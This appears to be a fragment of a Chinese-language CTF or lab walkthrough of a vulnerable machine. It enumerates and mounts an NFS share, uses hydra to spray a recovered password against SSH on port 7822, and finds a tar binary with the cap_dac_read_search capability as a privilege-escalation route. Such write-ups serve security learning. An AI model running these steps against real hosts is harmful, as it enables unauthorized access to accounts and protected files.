## 0x00 信息收集

![image-20201230210852745](https://i.loli.net/2020/12/30/OLymG54Ahbg9l6V.png)

查找到nfs共享服务，来使用共享目录来打他。

`showmount -e 192.168.43.148`

`mount -t nfs 192.168.43.148:/home/morris dots`  将共享目录挂载到本地。

```
hydra -L user -p TryToGuessThisNorris@2k19 ssh://192.168.0.180 -s 7822
```

```
You're smart enough to understand me. Here's your secret, TryToGuessThisNorris@2k19
```

```
/sbin/getcap -r / 2>/dev/null
```

```
/usr/bin/tar = cap_dac_read_search+ep
```

